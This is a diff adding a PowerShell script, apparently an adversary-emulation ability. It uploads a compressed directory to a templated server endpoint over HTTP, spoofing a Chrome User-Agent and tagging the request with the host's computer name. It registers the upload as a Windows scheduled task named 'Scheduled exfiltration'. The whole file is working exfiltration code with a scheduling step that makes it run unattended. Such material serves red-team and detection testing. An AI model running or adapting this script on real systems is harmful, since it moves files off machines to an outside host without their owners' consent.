@@ -1,0 +1,25 @@
+$commandString = '$fieldName = \"#{host.dir.compress}";
+$filePath = \"#{host.dir.compress}";
+$url = \"#{server}/file/upload\";
+Add-Type -AssemblyName \"System.Net.Http\";
+
+$client = New-Object System.Net.Http.HttpClient;
+$content = New-Object System.Net.Http.MultipartFormDataContent;
+$fileStream = [System.IO.File]::OpenRead($filePath);
+$fileName = [System.IO.Path]::GetFileName($filePath);
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+
+$xRequestIdHeader = \"X-Request-Id\";
+$xRequestIdField = $env:COMPUTERNAME + \"-#{paw}\";
+$content.Add($fileContent, $fieldName, $fileName);
+$client.DefaultRequestHeaders.Add($xRequestIdHeader, $xRequestIdField);
+
+$userAgentHeader = \"User-Agent\";
+$userAgentField = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\";
+$client.DefaultRequestHeaders.Add($userAgentHeader, $userAgentField);
+$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();';
+
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$commandString";
+$trigger = New-ScheduledTaskTrigger -Once -At 12pm;
+
+Register-ScheduledTask -TaskName "Scheduled exfiltration" -Trigger $trigger -Action $action;
